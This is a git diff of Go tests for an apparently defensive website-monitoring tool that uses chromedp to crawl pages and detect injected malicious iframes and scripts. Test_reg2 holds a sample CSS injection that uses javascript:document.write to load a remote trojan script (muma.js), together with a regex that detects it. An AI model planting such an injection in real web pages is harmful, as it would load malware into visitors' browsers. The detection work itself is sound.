@@ -4,24 +4,31 @@ import (
 	"context"
 	"fmt"
 	"github.com/TeaWeb/build/internal/teautils"
+	"github.com/chromedp/cdproto/cdp"
 	"github.com/chromedp/chromedp"
 	"log"
 	"regexp"
+	"sync"
 	"testing"
 	"time"
 )
 
 func Test_run(t *testing.T) {
 	fmt.Println(time.Now())
-	url := "http://www.pzsy888.com/abouts/intros.html"
-	en, html, err := chromeDpRun(url, nil)
+	url := "http://www.iyunke.net/"
+	ctxs, err := getWindowCtx()
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	en, html, err := chromeDpRun(url, <-ctxs)
 	fmt.Println(en.Url, en.Location)
-	fmt.Println(*html[0])
+	//fmt.Println(*html[0])
 	fmt.Println(err)
-	domainTop, domain := GetDomain(url)
-	Urls, _, err := GetUrlsAndCheck(html, domainTop, domain, url, 3)
+	domainTop, domain := en.GetDomain(url)
+	Urls, _, err := en.GetUrlsAndCheck(html, domainTop, domain, url, 3)
 	//监测结果
-	if ok, res := checkIframeHangingHorse(html, url, domainTop); ok && len(res) > 0 {
+	if ok, res := en.checkIframeHangingHorse(html, url, domainTop); ok && len(res) > 0 {
 		for k, v := range res {
 			fmt.Println(k, v)
 		}
@@ -53,15 +60,19 @@ func Test_run2(t *testing.T) {
 
 	ctx, cancel3 := chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf)) // 会打开浏览器并且新建一个标签页进行操作
 	fmt.Println(3)
-	location := ""
+	location, html, iframes := "", "", []*cdp.Node{}
 	//err := chromedp.Run(ctx, chromedp.Navigate(`https://blog.csdn.net/`))
 	err := chromedp.Run(ctx, chromedp.Tasks{
-		chromedp.Navigate(`http://www.fanyi.com`),
+		chromedp.Navigate(`http://182.150.0.125/test.html`),
 		chromedp.EvaluateAsDevTools("window.location.href;", &location),
+		chromedp.OuterHTML("html", &html, chromedp.ByQueryAll),
+		chromedp.Nodes("iframe", &iframes, chromedp.ByQueryAll),
 	})
 	fmt.Println(err)
 
 	fmt.Println("location", location)
+	fmt.Println("html", html)
+	fmt.Println("iframe", iframes)
 	time.Sleep(time.Second * 5)
 	chromedp.Cancel(ctx)
 	cancel1()
@@ -76,35 +87,25 @@ func Test_run3(t *testing.T) {
 	)
 	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
 	defer cancel()
+	ctx, _ := chromedp.NewRemoteAllocator(allocCtx, "ws://127.0.0.1:9222") //使用远程调试，可以结合下面的容器使用
 
 	// create chrome instance
-	ctx, cancel := chromedp.NewContext(
-		allocCtx,
+	ctx, cancel = chromedp.NewContext(
+		ctx,
 		chromedp.WithLogf(log.Printf),
 	)
+
 	defer cancel()
 
-	// create a timeout
-	ctx, cancel = context.WithTimeout(ctx, 5*time.Second)
-	defer cancel()
-
-	// navigate to a page, wait for an element, click
-	var example string
-	sel := `//*[@id="username"]`
-	err := chromedp.Run(ctx,
-		chromedp.Navigate(`https://github.com/awake1t`),
-		chromedp.WaitVisible("body"),
-		//缓一缓
-		chromedp.Sleep(2*time.Second),
-
-		chromedp.SendKeys(sel, "username", chromedp.BySearch), //匹配xpath
-
-	)
+	targets, err := chromedp.Targets(ctx)
 	if err != nil {
-		log.Fatal(err)
+		fmt.Println("err==", err)
+		return
 	}
 
-	log.Printf("Go's time.After example:\n%s", example)
+	for _, v := range targets {
+		fmt.Println(v.URL)
+	}
 	time.Sleep(time.Second * 10)
 }
 
@@ -142,9 +143,23 @@ if(search.indexOf("baidu")>0 || search.indexOf("so")>0 || searchindexOf.("soso")
 	fmt.Println(r)
 }
 
+func Test_reg2(t *testing.T) {
+	content := `background-image: url(" 
+javascript:document.write(\"<script src=http://www.djmp4.net/muma.js></script>\")')`
+	//background-image: url('javascript:document.write("<script src=http://www.djmp4.net/muma.js></script>")')
+	cssReg, e := regexp.Compile(`background-image\s{0,}\:\s{0,}url\([\s\'\"]{1,}javascript\:document\.write.*?\)`)
+	if e != nil {
+		fmt.Println(e)
+		return
+	}
+	r := cssReg.FindString(content)
+	fmt.Println(r)
+}
 func Test_getDomain(t *testing.T) {
-	url := "http://47.107.165.133:36111/yeyue.html?k=3Xrn9m913e6ISYyRHelJCLiAzN152L6lHeuUGeulGbv8iOzBHd0hmI6ICbyVnIsUWdyRnOis2YhJmIsUWdyRnOigXZzJCLlVnc0pjIz9WaiwiI1cDO4YDMxgjMxIiOiQWS0NWZylGZlJnIsIiN3ETMiojI0NWZylGZlJnIsATN6ISbvRmbhJnIsISN3ETMiojIklEbl5mbhh2YiwiI0cDO4YDMxgjMxIiOiQWSlRXazJyeOyYPJsi9&_=1666535114338#1666535255540\n["
-	fmt.Println(GetDomain(url))
+	en := &ChromeDpEngine{}
+	url := "https://www.cqwuxi.com/thread-1031441-1-1.html"
+	fmt.Println(en.GetDomain(url))
+	fmt.Println(en.GetUrl("//v.qq.com/txp/iframe/player.html?vid=m3366k2fvlr", "https://www.cqwuxi.com", "https://www.cqwuxi.com/thread-1031441-1-1.html"))
 }
 
 func Test_simplifyStr(t *testing.T) {
@@ -158,4 +173,77 @@ func Test_cache(t *testing.T) {
 	//time.Sleep(time.Second * 3)
 	v, ok := c.Get("icpTokenTime")
 	fmt.Println(v, ok)
+}
+
+func Test_for(t *testing.T) {
+
+	r := new(WeightRoundLoadBalance)
+	r.Add("A", 4, 1, 0)
+	r.Add("B", 4, 0, 0)
+	r.Add("C", 4, 3, 0)
+	fmt.Println(r.Get())
+	fmt.Println(r.Get())
+	fmt.Println(r.Get())
+	fmt.Println(r.Get())
+	fmt.Println(r.Get())
+	fmt.Println(r.Get())
+	fmt.Println(r.Get())
+}
+
+func Test_ch(t *testing.T) {
+	ch := make(chan ChromeHost, 4)
+	fmt.Println(len(ch))
+	ch <- ChromeHost{
+		Addr: "1",
+	}
+	ch <- ChromeHost{
+		Addr: "2",
+	}
+	ch <- ChromeHost{
+		Addr: "3",
+	}
+	ch <- ChromeHost{
+		Addr: "4",
+	}
+	wg := sync.WaitGroup{}
+	for i := 1; i < 10; i++ {
+		wg.Add(1)
+		go func(i int) {
+			win := <-ch
+			defer func() {
+				ch <- win
+				wg.Done()
+			}()
+			fmt.Println(win)
+			//使用窗口
+			time.Sleep(time.Second)
+		}(i)
+
+	}
+
+	wg.Wait()
+	fmt.Println("wai", len(ch))
+	num := len(ch)
+	for i := 1; i <= num; i++ {
+		fmt.Println("i=", i)
+		w := <-ch
+		//取出窗口 并关闭
+		fmt.Println(w)
+	}
+
+}
+
+func Test_http(t *testing.T) {
+	en := ChromeDpEngine{}
+	res, err := en.getCss("Content/reset.css")
+	fmt.Println(res)
+	fmt.Println(err)
+
+	cssReg, e := regexp.Compile(`background-image\s{0,}\:\s{0,}url\([\s\'\"]{1,}javascript\:document\.write.*?\)`)
+	if e != nil {
+		fmt.Println(e)
+		return
+	}
+	r := cssReg.FindString(res)
+	fmt.Println(r)
 }
